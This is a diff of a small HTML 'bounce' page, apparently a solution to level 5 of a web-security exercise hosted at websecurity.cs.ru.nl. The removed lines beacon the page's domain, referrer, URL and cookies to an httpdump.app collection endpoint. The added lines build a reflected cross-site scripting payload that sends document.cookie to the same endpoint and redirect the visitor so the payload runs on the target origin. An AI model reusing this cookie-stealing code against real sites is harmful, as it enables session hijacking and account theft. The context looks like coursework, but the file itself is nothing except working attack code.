@@ -1,19 +1,13 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>bounce</title>
 <script>
-(function(){
-  var data = [
-    "mark=level5",
-    "dom="+encodeURIComponent(document.domain),
-    "ref="+encodeURIComponent(document.referrer),
-    "loc="+encodeURIComponent(location.href),
-    "c="+encodeURIComponent(document.cookie)
-  ].join("&");
+/* build an on-target payload that runs on websecurity.cs.ru.nl */
+const payload = "<script>new Image().src='https://httpdump.app/dumps/2a0b49ec-bc8b-433c-b1f4-3b912adbd0ef?c='+encodeURIComponent(document.cookie)</" + "script>";
 
-  // primary: image beacon (bypasses CORS)
-  new Image().src = "https://httpdump.app/dumps/2a0b49ec-bc8b-433c-b1f4-3b912adbd0ef?"+data;
+/* try the English search param first; if it doesn't work, change 'query' to 'zoekterm' */
+const target = "https://websecurity.cs.ru.nl/?level=5&query=" + encodeURIComponent(payload);
 
-  // backup: sendBeacon if allowed
-  if (navigator.sendBeacon) {
-    navigator.sendBeacon("https://httpdump.app/dumps/2a0b49ec-bc8b-433c-b1f4-3b912adbd0ef?"+data);
-  }
-})();
+/* hard redirect so code executes on the TARGET origin */
+location.replace(target);
 </script>
